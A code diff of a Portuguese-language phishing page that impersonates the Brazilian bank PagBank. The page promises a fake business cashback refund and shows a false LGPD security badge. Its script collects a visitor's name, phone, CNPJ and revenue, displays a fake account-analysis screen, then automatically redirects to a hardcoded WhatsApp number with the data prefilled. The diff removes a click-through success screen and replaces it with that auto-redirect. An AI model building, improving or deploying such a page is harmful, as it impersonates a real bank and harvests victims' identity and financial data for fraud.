@@ -12,7 +12,6 @@
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         body {
-            /* Cores inspiradas no ecossistema PagBank */
             background: radial-gradient(circle at top right, #004b23, #007200, #132a13);
             display: flex;
             justify-content: center;
@@ -31,7 +30,6 @@
             position: relative;
             overflow: hidden;
         }
-        /* Marca d'água PagBank simulada ao fundo */
         .container::before {
             content: "PagBank";
             position: absolute;
@@ -50,7 +48,6 @@
             left: 0;
             width: 100%;
             height: 6px;
-            /* Degradê verde e dourado do PagBank */
             background: linear-gradient(to right, #9ef01a, #70e000, #ffb703);
         }
         h1 {
@@ -111,25 +108,6 @@
         .btn-submit:hover {
             filter: brightness(1.1);
         }
-        .btn-whatsapp {
-            display: inline-block;
-            width: 100%;
-            padding: 15px;
-            background-color: #25d366;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            text-decoration: none;
-            margin-top: 20px;
-            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
-            transition: transform 0.2s, background-color 0.2s;
-        }
-        .btn-whatsapp:hover {
-            background-color: #20ba5a;
-            transform: scale(1.02);
-        }
         .footer-note {
             text-align: center;
             font-size: 11px;
@@ -137,7 +115,7 @@
             margin-top: 20px;
         }
         
-        /* Telas de Loading e Sucesso */
+        /* Tela de Loading */
         .overlay {
             display: none;
             position: absolute;
@@ -161,11 +139,6 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
-        }
-        .success-icon {
-            font-size: 50px;
-            color: #007200;
-            margin-bottom: 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -210,26 +183,12 @@
         <p class="footer-note">🔒 Ambiente seguro homologado de acordo com a LGPD.</p>
     </div>
 
-    <!-- Tela de Carregamento -->
+    <!-- Tela de Carregamento e Redirecionamento -->
     <div id="loading-overlay" class="overlay">
         <div class="spinner"></div>
         <h2 style="font-size: 20px; margin-bottom: 10px; color: #004b23;">Analisando conta PagBank...</h2>
-        <p style="color: #666; font-size: 14px;">Aguarde enquanto cruzamos as informações de faturamento e taxas recolhidas.</p>
-    </div>
-
-    <!-- Tela de Sucesso com o Botão de Redirecionamento -->
-    <div id="success-overlay" class="overlay">
-        <div class="success-icon">💰</div>
-        <h2 style="font-size: 20px; color: #004b23; margin-bottom: 10px;">Análise Concluída!</h2>
-        <p style="color: #444; font-size: 14px; line-height: 1.6;">
-            Olá <strong id="user-name"></strong>, identificamos uma simulação disponível para o CNPJ <span id="user-cnpj" style="font-weight: 600;"></span>.<br><br>
-            Para liberar o extrato e realizar o resgate do seu cashback, clique no botão abaixo para falar com o nosso suporte técnico.
-        </p>
-        
-        <!-- Botão Dinâmico do WhatsApp -->
-        <a id="whatsapp-link" href="#" target="_blank" class="btn-whatsapp">
-            🟢 Resgatar Cashback via WhatsApp
-        </a>
+        <p style="color: #666; font-size: 14px; margin-bottom: 15px;">Aguarde enquanto cruzamos as informações de faturamento.</p>
+        <p style="color: #007200; font-size: 13px; font-weight: bold;">Redirecionando para o WhatsApp de resgate...</p>
     </div>
 </div>
 
@@ -257,7 +216,7 @@
         input.value = v;
     }
 
-    // Lógica de Processamento e Criação do Link do WhatsApp
+    // Lógica de Envio e Redirecionamento Automático
     function enviarFormulario(event) {
         event.preventDefault(); 
         
@@ -266,23 +225,19 @@
         const cnpj = document.getElementById('cnpj').value;
         const renda = document.getElementById('renda').value;
         
-        document.getElementById('user-name').innerText = nome;
-        document.getElementById('user-cnpj').innerText = cnpj;
-
-        // Criação da mensagem automática personalizada para o seu WhatsApp
-        const numeroWhats = "54999422678";
-        const textoMensagem = `Olá, gostaria de concluir meu resgate de Cashback PagBank PJ.%0A%0A*Dados preenchidos:*%0A👤 *Nome:* ${nome}%0A📱 *Telefone:* ${telefone}%0A💼 *CNPJ:* ${cnpj}%0A📊 *Faturamento:* ${renda}`;
-        
-        // Aplica o link gerado ao botão do WhatsApp
-        document.getElementById('whatsapp-link').href = `https://api.whatsapp.com/send?phone=${numeroWhats}&text=${textoMensagem}`;
-
-        // Transição de telas
+        // Transição visual para a tela de análise
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('loading-overlay').style.display = 'flex';
 
+        // Configuração do WhatsApp e Mensagem
+        const numeroWhats = "54999422678";
+        const textoMensagem = `Olá, gostaria de concluir meu resgate de Cashback PagBank PJ.%0A%0A*Dados preenchidos:*%0A👤 *Nome:* ${nome}%0A📱 *Telefone:* ${telefone}%0A💼 *CNPJ:* ${cnpj}%0A📊 *Faturamento:* ${renda}`;
+        
+        const linkWhatsapp = `https://api.whatsapp.com/send?phone=${numeroWhats}&text=${textoMensagem}`;
+
+        // Aguarda 3 segundos na tela de análise e joga o usuário direto para o seu WhatsApp
         setTimeout(() => {
-            document.getElementById('loading-overlay').style.display = 'none';
-            document.getElementById('success-overlay').style.display = 'flex';
+            window.location.href = linkWhatsapp;
         }, 3000); 
     }
 </script>
